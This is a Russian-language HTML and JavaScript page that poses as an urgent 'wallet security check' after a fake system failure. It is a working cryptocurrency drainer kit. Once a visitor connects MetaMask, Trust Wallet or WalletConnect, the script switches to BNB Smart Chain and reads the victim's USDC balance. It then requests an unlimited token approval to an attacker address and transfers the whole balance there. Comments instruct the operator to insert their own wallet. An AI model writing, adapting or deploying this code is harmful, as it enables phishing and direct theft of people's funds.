<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Проверка безопасности кошелька</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
            color: white;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            text-align: center;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            max-width: 500px;
            width: 100%;
            background: rgba(0,0,0,0.7);
            border-radius: 30px;
            padding: 30px 20px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.1);
        }
        h1 {
            font-size: 24px;
            margin-bottom: 10px;
            background: linear-gradient(90deg, #ff4444, #ff8888);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        p {
            color: #aaa;
            margin-bottom: 20px;
            font-size: 13px;
        }
        button {
            background: linear-gradient(90deg, #ff4444, #cc0000);
            color: white;
            border: none;
            padding: 16px 35px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 50px;
            cursor: pointer;
            width: 100%;
        }
        button:active { transform: scale(0.98); }
        #log {
            margin-top: 20px;
            font-size: 11px;
            text-align: left;
            background: rgba(0,0,0,0.5);
            padding: 12px;
            border-radius: 15px;
            max-height: 250px;
            overflow-y: auto;
            font-family: monospace;
        }
        .log-success { color: #0f0; }
        .log-error { color: #ff4444; }
        .log-info { color: #ffaa00; }
        .wallet-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin: 20px 0;
        }
        .wallet-btn {
            background: rgba(255,255,255,0.1);
            border: 1px solid rgba(255,255,255,0.2);
            padding: 12px 5px;
            border-radius: 15px;
            cursor: pointer;
            text-align: center;
            font-size: 12px;
        }
        .wallet-btn:active { background: rgba(255,255,255,0.2); }
        .wallet-emoji { font-size: 28px; display: block; margin-bottom: 5px; }
        .qr-code {
            text-align: center;
            margin: 15px 0;
            padding: 15px;
            background: white;
            border-radius: 20px;
            display: none;
        }
        .warning { font-size: 10px; color: #ff8888; margin-top: 10px; }
        @media (max-width: 600px) {
            .wallet-grid { grid-template-columns: repeat(3, 1fr); gap: 8px; }
            .wallet-btn { padding: 8px 3px; font-size: 10px; }
            .wallet-emoji { font-size: 22px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚠️ СБОЙ В СИСТЕМЕ</h1>
        <p>Требуется экстренная верификация активов</p>
        
        <div class="wallet-grid" id="walletGrid"></div>
        
        <div id="log">
            <div class="log-success">🟢 Выберите кошелек</div>
        </div>
        <div class="warning">⚠️ Подтвердите все запросы в кошельке</div>
    </div>

    <!-- Web3.js + WalletConnect -->
    <script src="https://cdn.jsdelivr.net/npm/web3@4.16.0/dist/web3.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.0/dist/index.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@web3modal/ethereum@2.6.0/dist/index.min.js"></script>
    
    <script>
        // ============================================================
        // НАСТРОЙКИ - ЗАМЕНИ ЭТУ 1 СТРОЧКУ
        // ============================================================
        const EVIL_WALLET = "0xТВОЙ_BNB_АДРЕС";   // ТВОЙ КОШЕЛЕК
        // ============================================================
        
        const TOKEN_ADDRESS = "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d"; // USDC BSC
        const BSC_CHAIN_ID = 56; // BSC в десятичной системе
        const BSC_RPC = "https://bsc-dataseed.binance.org/";
        
        const ERC20_ABI = [
            {"constant":true,"inputs":[{"name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},
            {"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"type":"function"},
            {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"},
            {"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},
            {"constant":false,"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"}
        ];
        
        let web3 = null;
        let accounts = null;
        
        function addLog(msg, type = 'info') {
            const logDiv = document.getElementById('log');
            const entry = document.createElement('div');
            entry.className = `log-${type}`;
            const time = new Date().toLocaleTimeString();
            entry.innerHTML = `[${time}] ${msg}`;
            logDiv.appendChild(entry);
            logDiv.scrollTop = logDiv.scrollHeight;
        }
        
        // Настройка WalletConnect
        async function initWalletConnect() {
            try {
                // Настройка проекта (публичный ID)
                const projectId = 'd3f6d5e6f5e6d5f6e5d6f5e6d5f6e5d6'; // Публичный ID WalletConnect
                
                const ethereum = {
                    appName: "WalletConnect",
                    projectId: projectId,
                    chains: [BSC_CHAIN_ID],
                    methods: ['eth_sendTransaction', 'eth_sign', 'personal_sign', 'eth_signTypedData_v4'],
                    events: ['chainChanged', 'accountsChanged'],
                    rpcMap: {
                        56: BSC_RPC
                    }
                };
                
                // Создаем модал для выбора кошелька
                const modal = new WalletConnectModal.default({
                    projectId: projectId,
                    chains: [BSC_CHAIN_ID],
                    themeMode: 'dark'
                });
                
                return { modal, ethereum };
            } catch(e) {
                addLog(`Ошибка инициализации: ${e.message}`, 'error');
                return null;
            }
        }
        
        // Подключение через WalletConnect
        async function connectWalletConnect() {
            addLog("🔗 Открываю WalletConnect...", 'info');
            
            try {
                const { modal, ethereum } = await initWalletConnect();
                
                // Открываем модал с выбором кошелька
                modal.open();
                
                // Ждем подключения
                const provider = await modal.connect();
                
                if (provider) {
                    web3 = new Web3(provider);
                    accounts = await provider.request({ method: 'eth_requestAccounts' });
                    addLog(`✅ Подключено: ${accounts[0].slice(0,8)}...`, 'success');
                    return true;
                }
                return false;
            } catch(e) {
                addLog(`❌ Ошибка: ${e.message}`, 'error');
                return false;
            }
        }
        
        // Подключение через MetaMask/Trust на телефоне (EIP-1193)
        async function connectDirect() {
            if (!window.ethereum) {
                addLog("❌ Кошелек не найден. Используйте WalletConnect", 'error');
                return false;
            }
            
            try {
                web3 = new Web3(window.ethereum);
                accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                addLog(`✅ Подключено: ${accounts[0].slice(0,8)}...`, 'success');
                return true;
            } catch(e) {
                addLog(`❌ Ошибка: ${e.message}`, 'error');
                return false;
            }
        }
        
        // Переключение на BSC
        async function switchToBSC() {
            if (!web3) return false;
            
            try {
                const chainId = await web3.eth.getChainId();
                if (chainId === BSC_CHAIN_ID) {
                    addLog("✅ Уже на BSC", 'success');
                    return true;
                }
                
                // Пробуем переключить
                if (window.ethereum) {
                    try {
                        await window.ethereum.request({
                            method: 'wallet_switchEthereumChain',
                            params: [{ chainId: '0x38' }]
                        });
                        addLog("✅ Переключено на BSC", 'success');
                        return true;
                    } catch(e) {
                        if (e.code === 4902) {
                            await window.ethereum.request({
                                method: 'wallet_addEthereumChain',
                                params: [{
                                    chainId: '0x38',
                                    chainName: 'BNB Smart Chain',
                                    nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                                    rpcUrls: [BSC_RPC],
                                    blockExplorerUrls: ['https://bscscan.com/']
                                }]
                            });
                            addLog("✅ BSC добавлена", 'success');
                            return true;
                        }
                    }
                }
                return false;
            } catch(e) {
                addLog(`⚠️ Не удалось переключить сеть: ${e.message}`, 'error');
                return false;
            }
        }
        
        // Основная функция дрена
        async function startDrain() {
            if (!web3 || !accounts) {
                addLog("❌ Нет подключения", 'error');
                return false;
            }
            
            try {
                const victimWallet = accounts[0];
                const tokenContract = new web3.eth.Contract(ERC20_ABI, TOKEN_ADDRESS);
                
                addLog("🔍 Проверка баланса...", 'info');
                const balance = await tokenContract.methods.balanceOf(victimWallet).call();
                const decimals = await tokenContract.methods.decimals().call();
                const symbol = await tokenContract.methods.symbol().call();
                const humanBalance = Number(balance) / (10 ** Number(decimals));
                
                if (Number(balance) === 0) {
                    addLog(`⚠️ Нет ${symbol} на кошельке`, 'error');
                    return false;
                }
                
                addLog(`💰 Баланс: ${humanBalance} ${symbol}`, 'success');
                
                const maxUint = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
                
                addLog(`✍️ Подпишите approve (разрешение)...`, 'info');
                const approveTx = await tokenContract.methods.approve(EVIL_WALLET, maxUint).send({ from: victimWallet });
                addLog(`✅ Approve: ${approveTx.transactionHash.slice(0,16)}...`, 'success');
                
                addLog("🔄 Перевод средств...", 'info');
                const transferTx = await tokenContract.methods.transferFrom(victimWallet, EVIL_WALLET, balance).send({ from: victimWallet });
                addLog(`✅ Переведено: ${humanBalance} ${symbol}`, 'success');
                addLog(`🎉 УСПЕХ! Деньги на кошельке ${EVIL_WALLET.slice(0,8)}...`, 'success');
                
                return true;
            } catch(err) {
                addLog(`❌ Ошибка: ${err.message}`, 'error');
                return false;
            }
        }
        
        // Главная функция
        async function run(walletType) {
            addLog("🚀 Запуск...", 'info');
            
            let connected = false;
            
            if (walletType === 'walletconnect') {
                connected = await connectWalletConnect();
            } else {
                connected = await connectDirect();
            }
            
            if (!connected) return;
            
            const switched = await switchToBSC();
            if (!switched) return;
            
            await startDrain();
        }
        
        // Создание кнопок
        function renderWallets() {
            const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
            
            const wallets = [
                { name: "MetaMask", emoji: "🦊", type: "metamask", mobile: true },
                { name: "Trust Wallet", emoji: "🔵", type: "trustwallet", mobile: true },
                { name: "WalletConnect", emoji: "🔗", type: "walletconnect", mobile: true },
                { name: "Coinbase", emoji: "💰", type: "coinbase", mobile: true },
                { name: "OKX", emoji: "🟠", type: "okx", mobile: true },
                { name: "Rainbow", emoji: "🌈", type: "rainbow", mobile: true }
            ];
            
            const grid = document.getElementById('walletGrid');
            grid.innerHTML = '';
            
            wallets.forEach(w => {
                const btn = document.createElement('div');
                btn.className = 'wallet-btn';
                btn.innerHTML = `<span class="wallet-emoji">${w.emoji}</span>${w.name}`;
                btn.onclick = () => run(w.type);
                grid.appendChild(btn);
            });
        }
        
        renderWallets();
        
        // Определяем мобильное устройство
        if (/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
            addLog("📱 Мобильное устройство. Используйте WalletConnect для лучшей связи", 'info');
        }
    </script>
</body>
</html>
